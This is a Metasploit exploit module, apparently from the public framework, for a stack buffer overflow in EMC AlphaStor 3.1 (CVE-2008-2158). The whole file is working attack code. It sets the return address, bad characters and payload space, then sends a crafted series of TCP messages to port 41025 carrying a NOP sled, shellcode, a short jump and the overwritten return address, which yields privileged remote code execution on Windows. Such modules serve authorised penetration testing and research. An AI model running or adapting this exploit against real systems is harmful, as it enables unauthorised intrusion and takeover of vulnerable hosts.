##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'EMC AlphaStor Agent Buffer Overflow',
      'Description'    => %q{
          This module exploits a stack buffer overflow in EMC AlphaStor 3.1.
        By sending a specially crafted message, an attacker may
        be able to execute arbitrary code.
      },
      'Author'         => 'MC',
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2008-2158' ],
          [ 'OSVDB', '45714' ],
          [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=702' ],
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process', # one-shot overwrite.
        },
      'Payload'        =>
        {
          'Space'    => 750,
          'BadChars' => "\x00\x0a\x0d\x20",
          'StackAdjustment' => -3500,
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'EMC AlphaStor 3.1', { 'Ret' => 0x65153fe0 } ], # dblib9.dll 9.0.1.1975
        ],
      'Privileged'     => true,
      'DisclosureDate' => '2008-05-27',
      'DefaultTarget' => 0))

    register_options([Opt::RPORT(41025)])
  end

  def exploit
    connect

    # overwrite via: ascli.exe asopmsg "long_buff"
    uno = [0x0000000b].pack('V')
    sock.put(uno)

    dos =  rand_text_alpha_upper(3) + "@" + rand_text_alpha_upper(6) + "\x00"
    sock.put(dos)

    tres = [0x00000004].pack('V')
    sock.put(tres)

    quatro = [0x0000001b].pack('V')
    sock.put(quatro)

    cinco = [0x0000047c].pack('V')
    sock.put(cinco)

    data =  make_nops(827 - payload.encoded.length) + payload.encoded
    data << make_nops(2) + Rex::Arch::X86.jmp_short(6) + [target.ret].pack('V')
    data << make_nops(8) + [0xe8, -750].pack('CV') + rand_text_alpha_upper(500) + "\x00"

    print_status("Trying target #{target.name}...")
    sock.put(data)

    handler
    disconnect
  end
end
